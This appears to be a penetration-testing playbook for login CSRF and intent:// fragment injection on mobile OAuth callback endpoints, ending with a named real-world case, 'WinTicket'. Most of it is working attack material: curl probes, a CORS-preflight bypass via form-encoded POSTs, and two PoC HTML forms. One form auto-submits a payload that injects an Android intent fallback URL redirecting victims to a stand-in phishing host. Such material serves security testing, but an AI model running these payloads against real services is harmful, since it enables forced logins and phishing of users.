# Intent:// Injection Login CSRF — Full PoC Pattern

## When to Use
- Target has mobile OAuth callback endpoint (`/v1/auth/apple`, `/v1/auth/google`)
- Server returns 307 redirect with `intent://` URI in Location header
- POST body is reflected unsanitized into the redirect

## Detection
```bash
# Test if OAuth callback reflects body into intent://
curl -sk -X POST "https://api.target.com/v1/auth/apple" \
  -H "Content-Type: application/json" \
  -d '{"code":"INJECTED","id_token":"EVIL"}' -D- | grep -i "location"
# Look for: Location: intent://callback?{"code":"INJECTED",...}#Intent;package=...;end
```

## Critical: CORS Preflight Bypass via Form-Encoded POST

Browsers skip CORS preflight for "simple" content types:
- `application/x-www-form-urlencoded` ← NO preflight
- `text/plain` ← NO preflight  
- `multipart/form-data` ← NO preflight

If server accepts form-encoded AND JSON identically, cross-origin Login CSRF works:

```bash
# Test form-encoded (bypasses CORS OPTIONS check)
curl -sk -X POST "https://api.target.com/v1/auth/apple" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://evil.com" \
  -d "code=ATTACKER_CODE&id_token=FAKE&user=%7B%22name%22%3A%22hacker%22%7D" -D-
# If Location header contains reflected params → EXPLOITABLE from cross-origin
```

## PoC HTML (Cross-Origin Login CSRF)
```html
<!DOCTYPE html>
<html>
<head><title>Login CSRF via Intent Injection</title></head>
<body>
<h1>Login CSRF PoC</h1>
<form id="csrf" method="POST" 
  action="https://api.target.com/v1/auth/apple" 
  enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="code" value="ATTACKER_AUTH_CODE"/>
  <input type="hidden" name="id_token" value="ATTACKER_ID_TOKEN"/>
  <input type="hidden" name="user" value='{"name":"Attacker"}'/>
  <input type="submit" value="Click here"/>
</form>
<script>
// Auto-submit for real attack:
// document.getElementById('csrf').submit();
</script>
</body>
</html>
```

## Verification Steps
1. Confirm POST body reflected in Location header (307)
2. Confirm form-encoded content type accepted (same reflection)
3. Confirm NO state/nonce parameter required
4. Confirm cross-origin POST works (Origin: evil.com still gets 307)
5. Document: what package receives the intent, what data is controllable

## Impact Assessment

| Condition | Severity |
|-----------|----------|
| Form-encoded works + no state + app trusts deep link data | High |
| JSON-only (CORS blocks browser) + mobile app vector only | Medium |
| State/nonce validated server-side | Not exploitable |
| App re-validates code via token exchange | Low (code fails exchange) |

## Key Indicators in Response
- HTTP 307 (not 302/301) — server-side redirect preserving method
- `intent://` scheme in Location header
- `#Intent;package=<app>;scheme=<provider>;end` format
- Full body reflection without sanitization/encoding

## Limitations
- If ONLY `application/json` triggers the reflection (not form-encoded), browser CORS preflight blocks it
- Mobile-only exploitation via: malicious app, WebView, app-to-app intent
- App may validate the code server-side (exchange fails for forged codes)
- Impact depends on what the app does with the injected data

## Intent Fragment Injection (Escalation: HIGH)

When server appends `#Intent;package=...;end` to the Location header, a raw `#` in the POST body SPLITS the fragment. Android's intent parser reads the FIRST `#Intent;...;end` block — attacker controls it entirely.

### Detection
```bash
# Inject raw # to break fragment boundary
curl -sk -X POST "https://api.target.com/v1/auth/apple" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'code=x#Intent;package=com.nonexistent.app;S.browser_fallback_url=https://evil.com/phish;end//'
# Expected: Location: intent://callback?code=x#Intent;package=com.nonexistent.app;S.browser_fallback_url=https://evil.com/phish;end//#Intent;package=real.app;scheme=...;end
```

### Why This Works
- Server builds: `intent://callback?{body}#Intent;package=real;end`
- Raw `#` in body creates: `intent://callback?code=x` + `#Intent;...attacker...;end//` + `#Intent;...real...;end`
- Android intent parser uses FIRST `#Intent;` block → attacker's
- `package=com.nonexistent.app` → app not found → triggers `S.browser_fallback_url`
- Victim redirected to `https://evil.com/phish`

### PoC HTML (Fragment Injection)
```html
<!DOCTYPE html>
<html><body>
<form id="exploit" method="POST" action="https://api.target.com/v1/auth/apple">
  <input type="hidden" name="code" 
    value="x#Intent;package=com.nonexistent.app;S.browser_fallback_url=https://evil.com/phish;end//">
</form>
<script>document.getElementById('exploit').submit();</script>
</body></html>
```

### Impact
- **Without app installed**: victim redirected to attacker URL (phishing)
- **With app installed**: attacker can override `action`, inject extras via `S.key=value`
- Escalates basic Login CSRF (Medium) to Open Redirect + Phishing (High)

### Key Conditions
- Server must NOT URL-encode `#` in the body before placing in Location header
- `%23` (URL-encoded #) does NOT work — server must pass raw `#` through
- Test both `application/x-www-form-urlencoded` and `--data-binary` (raw bytes)

## WinTicket Case (June 2026)
- Endpoint: `POST /v1/auth/apple`
- Response: `307 → intent://callback?{body}#Intent;package=jp.winticket.app;scheme=signinwithapple;end`
- Form-encoded accepted: YES (CORS bypass confirmed)
- State parameter: NONE
- Controllable fields: code, id_token, redirect_uri, user
- CORS OPTIONS: returns 405 (blocks JSON from browser)
- But form-encoded bypasses preflight → cross-origin exploit works
- **Fragment injection confirmed**: raw `#` splits intent, `S.browser_fallback_url` injection works
- Escalation: Login CSRF (Medium) + Fragment Injection (High) = combined High finding
